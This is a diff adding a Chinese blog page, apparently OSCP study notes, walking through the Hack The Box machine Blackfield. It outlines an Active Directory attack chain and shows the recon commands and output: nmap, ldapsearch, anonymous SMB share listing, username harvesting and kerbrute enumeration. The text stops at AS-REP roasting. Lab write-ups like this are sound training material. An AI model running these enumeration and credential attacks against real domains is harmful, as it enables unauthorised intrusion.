@@ -1,0 +1,771 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="So1Lupus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTB Blackfiled  Walkthrough0x00 盒子简介  0x01 思路简介​		获得靶机后，我运用nmap进行服务端口信息收集，发现可以利用匿名用户登录共享文件夹profile$，但里面没有任何内容，但我们可以利用文件夹列表建立用户名列表，然后利用AS-REP roasting获得有效凭证，然后利用bloodhound发现改用户权限，从而利用RPC重置另一个账户的密码，然后利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Road-to-OSCP-7-Blackfield">
+<meta property="og:url" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/index.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="HTB Blackfiled  Walkthrough0x00 盒子简介  0x01 思路简介​		获得靶机后，我运用nmap进行服务端口信息收集，发现可以利用匿名用户登录共享文件夹profile$，但里面没有任何内容，但我们可以利用文件夹列表建立用户名列表，然后利用AS-REP roasting获得有效凭证，然后利用bloodhound发现改用户权限，从而利用RPC重置另一个账户的密码，然后利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/Blackfield.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509230203124.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/userflag.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509232448021.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509233656418.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509233605284.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509234412462.png">
+<meta property="og:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/rootflag.png">
+<meta property="article:published_time" content="2023-05-09T15:51:50.000Z">
+<meta property="article:modified_time" content="2023-05-09T15:55:14.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/Blackfield.png">
+  
+  
+  
+  <title>Road-to-OSCP-7-Blackfield - So1Lupus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>So1Lupus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Road-to-OSCP-7-Blackfield"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-09 23:51" pubdate>
+          2023年5月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          115 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Road-to-OSCP-7-Blackfield</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="HTB-Blackfiled-Walkthrough"><a href="#HTB-Blackfiled-Walkthrough" class="headerlink" title="HTB Blackfiled  Walkthrough"></a>HTB Blackfiled  Walkthrough</h1><h2 id="0x00-盒子简介"><a href="#0x00-盒子简介" class="headerlink" title="0x00 盒子简介"></a>0x00 盒子简介</h2><img src="/2023/05/09/Road-to-OSCP-7-Blackfield/Blackfield.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="0x01-思路简介"><a href="#0x01-思路简介" class="headerlink" title="0x01 思路简介"></a>0x01 思路简介</h2><p>​		获得靶机后，我运用nmap进行服务端口信息收集，发现可以利用匿名用户登录共享文件夹profile$，但里面没有任何内容，但我们可以利用文件夹列表建立用户名列表，然后利用AS-REP roasting获得有效凭证，然后利用bloodhound发现改用户权限，从而利用RPC重置另一个账户的密码，然后利用该账户访问另一个共享文件，其中获得了lsass的内存转储，然后在本地利用pypykatz来转储它的哈希值。最后，使用winrm登录最新获取的用户，利用sebackupprivilege权限来备份ntds.dit,从而进一步获得所有账户的哈希转储。</p>
+<h2 id="0x02-Recon"><a href="#0x02-Recon" class="headerlink" title="0x02 Recon"></a>0x02 Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>TCP：</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">$ nmap --<span class="hljs-built_in">min</span>-<span class="hljs-built_in">rate</span> <span class="hljs-number">10000</span> -p- -Pn -oN nmaptcp<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">$</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-p</span> <span class="hljs-number">53</span><span class="hljs-string">,88,135,445,3268,5985</span> <span class="hljs-string">-sC</span> <span class="hljs-string">-sV</span> <span class="hljs-string">-oN</span> <span class="hljs-string">nmaptcp</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>                                                                <br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.46s</span> <span class="hljs-string">latency).</span><br>                        <br><span class="hljs-string">PORT</span>     <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>       <span class="hljs-string">VERSION</span><br><span class="hljs-number">53</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>        <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span><br><span class="hljs-number">88</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2023-05-09 16:08:58Z</span><span class="hljs-string">)</span><br><span class="hljs-number">135</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds?</span><br><span class="hljs-number">3268</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">BLACKFIELD.local0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">5985</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>                         <br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">DC01;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br><br><span class="hljs-attr">Host script results:</span>                            <br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span>                                    <br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2023-05-09T16:09:19</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-string">N/A</span>                             <br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-string">6h59m59s</span>                          <br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span>                           <br><span class="hljs-string">|</span>   <span class="hljs-attr">311:</span>                                        <br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span><br><br><span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-comment"># Nmap done at Tue May  9 17:10:00 2023 -- 1 IP address (1 host up) scanned in 72.69 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>UDP：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">nmap</span> -sU --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> -<span class="hljs-keyword">p</span>- -oN nmapudp <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.79</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> <span class="hljs-keyword">open</span>|filtered udp ports (<span class="hljs-keyword">no</span>-response)<br>PORT    STATE SERVICE<br><span class="hljs-number">53</span>/udp  <span class="hljs-keyword">open</span>  domain<br><span class="hljs-number">389</span>/udp <span class="hljs-keyword">open</span>  ldap<br></code></pre></td></tr></table></figure>
+
+<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><p>获得了<code>domain name</code>:BLACKFIELD.local</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$ ldapsearch <span class="hljs-params">-H</span> ldap:<span class="hljs-comment">//10.10.10.192 -x -s base namingcontexts</span><br><br>namingcontexts: DC=BLACKFIELD,DC=<span class="hljs-built_in">local</span><br>namingcontexts: <span class="hljs-literal">CN</span>=Configuration,DC=BLACKFIELD,DC=<span class="hljs-built_in">local</span><br>namingcontexts: <span class="hljs-literal">CN</span>=Schema,<span class="hljs-literal">CN</span>=Configuration,DC=BLACKFIELD,DC=<span class="hljs-built_in">local</span><br>namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=<span class="hljs-built_in">local</span><br>namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=<span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>发现可以匿名访问两个共享文件夹</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span> -u <span class="hljs-keyword">null</span>    <br>[+] Guest <span class="hljs-keyword">session</span>       IP: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>:<span class="hljs-number">445</span>    <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>                                      <br>        Disk                                                    Permissions     <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">----                                                    -----------     -------</span><br>        <span class="hljs-keyword">ADMIN</span>$                                                  <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Remote <span class="hljs-keyword">Admin</span><br>        C$                                                      <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        forensic                                                <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Forensic / Audit <span class="hljs-keyword">share</span>.<br>        IPC$                                                    <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Remote IPC<br>        NETLOGON                                                <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>        profiles$                                               <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br>        SYSVOL                                                  <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span><br></code></pre></td></tr></table></figure>
+
+<p>最后在<code>profiles$</code>找到了一些有效的内容，但是每个文件夹中都没有内容，但是关注到文件夹名称，我们可以收集文件夹名作为用户名列表。</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ smbclient -N \\\\10.10.10.192\\profiles$                                                                                                                                                       <br>Try &quot;help&quot; to get a list of possible commands.                                                                                                                                                     <br>smb: \&gt; ls                                                                                                                                                                                         <br>  .                                   D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:12<span class="hljs-number"> 2020 </span>                                                          <br>  ..                                  D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:12<span class="hljs-number"> 2020 </span>                                                   <br>  AAlleni                             D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                          <br>  ABarteski                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                          <br>  ABekesz                             D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                         <br>  ABenzies                            D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                          <br>  ABiemiller                          D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                          <br>  AChampken                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                          <br>  ACheretei                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                          <br>  ACsonaki                            D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                         <br>  AHigchens                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                         <br>  AJaquemai                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11<span class="hljs-number"> 2020 </span>                                                   <br>  AKlado                              D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  AKoffenburger                       D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  AKollolli                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  AKruppe                             D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  AKubale                             D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  ALamerz                             D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  AMaceldon                           D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  AMasalunga                          D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  ANavay                              D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  ANesterova                          D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  ANeusse                             D       <span class="hljs-number"> 0 </span> Thu Jun <span class="hljs-number"> 4 </span>00:47:11 2020<br>  &lt;SNIP&gt;<br></code></pre></td></tr></table></figure>
+
+<p>下载所有文件夹后，将所有文件名整理到文件中。</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">smb: <span class="hljs-string">\&gt;</span> recurse <span class="hljs-literal">on</span><br>smb: <span class="hljs-string">\&gt;</span> prompt <span class="hljs-literal">off</span><br>smb: <span class="hljs-string">\&gt;</span> mget *<br>smb: <span class="hljs-string">\&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -al|<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;:&#x27;</span> -f2|<span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span>|<span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;,&#x27;</span> -f2 &gt; <span class="hljs-built_in">users</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-Access-as-support"><a href="#0x03-Access-as-support" class="headerlink" title="0x03 Access as support"></a>0x03 Access as support</h2><h3 id="userenum"><a href="#userenum" class="headerlink" title="userenum"></a>userenum</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/kerbrute_ userenum --dc 10.10.10.192 -d BLACKFIELD.LOCAL /</span>home<span class="hljs-regexp">/sollupus/</span>OSCP<span class="hljs-regexp">/Blackfield/</span>Creds/users -t <span class="hljs-number">50</span>                                                                                  <br><br>    __             __               __     <br>   <span class="hljs-regexp">/ /</span>_____  _____<span class="hljs-regexp">/ /</span>_  _______  __<span class="hljs-regexp">/ /</span>____ <br>  <span class="hljs-regexp">/ /</span><span class="hljs-regexp">/_/</span> _ \<span class="hljs-regexp">/ ___/</span> __ \<span class="hljs-regexp">/ ___/</span> <span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/ __/</span> _ \<br> <span class="hljs-regexp">/ ,&lt; /</span>  __<span class="hljs-regexp">/ /</span>  <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/ /</span> <span class="hljs-regexp">/  /</span> <span class="hljs-regexp">/_/</span> <span class="hljs-regexp">/ /</span>_<span class="hljs-regexp">/  __/</span><br><span class="hljs-regexp">/_/</span>|_|\___<span class="hljs-regexp">/_/</span>  <span class="hljs-regexp">/_.___/</span>_<span class="hljs-regexp">/   \__,_/</span>\__<span class="hljs-regexp">/\___/</span>                                        <br><br>Version: v1.<span class="hljs-number">0.3</span> (<span class="hljs-number">9</span>dad6e1) - <span class="hljs-number">05</span><span class="hljs-regexp">/09/</span><span class="hljs-number">23</span> - Ronnie Flathers @ropnop<br><br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">09</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">09</span> &gt;  Using KDC(s):<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">09</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">09</span> &gt;   <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>:<span class="hljs-number">88</span><br><br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">09</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">14</span> &gt;  [+] VALID USERNAME:       audit2020@BLACKFIELD.LOCAL<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">09</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">43</span> &gt;  [+] VALID USERNAME:       support@BLACKFIELD.LOCAL<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">09</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">43</span> &gt;  [+] VALID USERNAME:       svc_backup@BLACKFIELD.LOCAL<br><span class="hljs-number">2023</span><span class="hljs-regexp">/05/</span><span class="hljs-number">09</span> <span class="hljs-number">22</span>:<span class="hljs-number">41</span>:<span class="hljs-number">48</span> &gt;  Done! Tested <span class="hljs-number">315</span> usernames (<span class="hljs-number">3</span> valid) <span class="hljs-keyword">in</span> <span class="hljs-number">39.649</span> seconds<br></code></pre></td></tr></table></figure>
+
+<h3 id="AS-REP-roast"><a href="#AS-REP-roast" class="headerlink" title="AS-REP roast"></a>AS-REP roast</h3><p>获得有效用户名列表后，利用impacket里的<code>GetNPUsers</code>执行</p>
